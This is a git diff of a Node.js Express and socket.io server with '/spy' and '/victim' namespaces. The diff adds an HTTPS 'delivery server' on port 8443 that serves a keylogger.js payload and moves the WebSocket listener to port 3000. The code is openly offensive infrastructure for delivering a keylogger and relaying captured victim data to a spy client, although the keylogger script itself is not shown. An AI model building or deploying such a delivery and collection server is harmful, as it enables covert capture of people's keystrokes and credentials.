@@ -1,19 +1,17 @@
 const express = require('express');
 const http = require('http');
+var https = require('https');
+var fs = require('fs');
 const path = require('path');
 
 const app = express();
 
 const { Server } = require("socket.io");
 
-const server = http.createServer(app);
-const io = new Server(server);
+const socketServer = http.createServer(app);
+const io = new Server(socketServer);
 
 app.use("/", express.static(path.join(__dirname, 'public')));
-
-server.listen(3000, () => {
-    console.log('listening on *:3000');
-});
 
 const spy = io
     .of('/spy')
@@ -59,3 +57,30 @@ const victim = io
             console.log('Victim disconnected');
         });
     });
+
+
+var privateKey = fs.readFileSync(__dirname + '/../certs/server.key', 'utf8');
+var certificate = fs.readFileSync(__dirname + '/../certs/server.crt', 'utf8');
+
+var encryption = {
+    key: privateKey,
+    cert: certificate
+};
+
+https.createServer(encryption, (req, res) => {
+    fs.readFile(__dirname + '/delivery/keylogger.js', function (err, data) {
+        if (err) {
+            res.writeHead(404);
+            res.end(JSON.stringify(err));
+            return;
+        }
+        res.writeHead(200);
+        res.end(data);
+    });
+}).listen(8443, () => {
+    console.log('Delivery server: https://0.0.0.0:8443/keylogger.js.');
+});
+
+socketServer.listen(3000, () => {
+    console.log('WebSocket server listen on ws://0.0.0.0:3000');
+});
